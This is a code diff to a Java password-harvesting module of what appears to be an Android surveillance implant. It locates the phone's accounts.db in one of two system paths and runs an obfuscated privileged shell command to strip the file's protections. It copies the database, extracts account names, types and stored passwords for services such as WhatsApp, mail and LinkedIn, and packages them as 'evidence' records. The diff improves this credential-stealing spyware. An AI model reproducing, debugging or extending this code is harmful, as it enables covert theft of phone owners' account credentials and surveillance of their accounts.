@@ -29,7 +29,7 @@ public class ModulePassword extends BaseModule {
 	private static final int ELEM_DELIMITER = 0xABADC0DE;
 	private Markup markupPassword;
 	private HashMap<String, String> lastPasswords;
-	private HashMap<String, Integer> services = new HashMap<String,Integer>();;
+	private HashMap<String, Integer> services = new HashMap<String, Integer>();;
 
 	@Override
 	protected boolean parse(ConfModule conf) {
@@ -41,7 +41,7 @@ public class ModulePassword extends BaseModule {
 			services.put("whatsapp", 0x07);
 			services.put("mail", 0x09);
 			services.put("linkedin", 0x0a);
-			
+
 			return true;
 		} else {
 			if (Cfg.DEBUG) {
@@ -49,7 +49,7 @@ public class ModulePassword extends BaseModule {
 			}
 			return false;
 		}
-		
+
 	}
 
 	@Override
@@ -64,23 +64,53 @@ public class ModulePassword extends BaseModule {
 
 	@Override
 	protected void actualGo() {
-		//h_1=/data/system/users/0/
-		//h_2=accounts.db
-		String path = Messages.getString("h_1");
-		String dbFile = path + Messages.getString("h_2");
-		
-		String localFile = Path.markup() + Messages.getString("h_2");
+		// h_0=/data/system/
+		// h_1=/data/system/users/0/
+		// h_2=accounts.db
+		String pathUser = Messages.getString("h_1");
+		String pathSystem = Messages.getString("h_0");
+		String file = Messages.getString("h_2");
 
-		if (unprotect(path) && unprotect(dbFile)) {
-			try {
-				Utils.copy(new File(dbFile), new File(localFile));
-				dumpPasswordDb(localFile);
-			} catch (IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
-			
+		String dbFile = "";
+		
+		File fu=new File(pathUser,file);
+		File fs=new File(pathSystem,file);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (dumpPasswordDb): fs=" + fs.exists() + " fu=" +fu.exists());
 		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (dumpPasswordDb) " + fs.getAbsolutePath() + " " + fs.getParent());
+		}
+
+		if (fu.exists() && unprotect(fu.getParent()) && unprotect(fu.getAbsolutePath())) {
+
+			dbFile = fu.getAbsolutePath();
+		} else if (fs.exists() && unprotect(fs.getParent()) && unprotect(fs.getAbsolutePath())) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable accounts.db");
+			}
+			dbFile = fs.getAbsolutePath();
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable accounts.db");
+			}
+			return;
+		}
+
+		String localFile = Path.markup() + file;
+
+		try {
+			Utils.copy(new File(dbFile), new File(localFile));
+			dumpPasswordDb(localFile);
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (dumpPasswordDb) ERROR: " + e);
+				}
+			}
+		}
+
 	}
 
 	private void dumpPasswordDb(String dbFile) {
@@ -111,7 +141,7 @@ public class ModulePassword extends BaseModule {
 			String password = cursor.getString(3);
 			String service = getService(type);
 
-			String value = name +"_"+ type +"_"+ password;
+			String value = name + "_" + type + "_" + password;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (dumpPasswordDb): id : " + jid + " name : " + name + " type: " + type + " pw: "
@@ -132,11 +162,14 @@ public class ModulePassword extends BaseModule {
 				evidence.write(WChar.getBytes(password, true));
 				evidence.write(WChar.getBytes(service, true));
 				evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
-				
-				createEvidenceLocal(type,name);
-				
+
+				createEvidenceLocal(type, name);
+
 			}
 		}
+		
+		cursor.close();
+		db.close();
 
 		if (needToSerialize) {
 			markupPassword.serialize(lastPasswords);
@@ -148,40 +181,42 @@ public class ModulePassword extends BaseModule {
 	private String getService(String type) {
 
 		Iterator<String> iter = services.keySet().iterator();
-		while(iter.hasNext()){
+		while (iter.hasNext()) {
 			String key = iter.next();
-			if(type.contains(key)){
+			if (type.contains(key)) {
 				return key;
 			}
 		}
 		return "service";
-		
+
 	}
-	
+
 	private int getServiceId(String type) {
 
 		Iterator<String> iter = services.keySet().iterator();
-		while(iter.hasNext()){
+		while (iter.hasNext()) {
 			String key = iter.next();
-			if(type.contains(key)){
+			if (type.contains(key)) {
 				return services.get(key);
 			}
 		}
-		
+
 		return 0;
-		
+
 	}
 
 	private void createEvidenceLocal(String type, String name) {
-		int evId=getServiceId(type);
-		
-	
-		if(evId!=0)
+		int evId = getServiceId(type);
+
+		if (evId != 0)
 			ModuleAddressBook.createEvidenceLocal(evId, name);
 	}
 
 	private boolean unprotect(String path) {
 		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
+			}
 			Runtime.getRuntime().exec(Messages.getString("h_3") + path);
 			return true;
 		} catch (IOException e) {
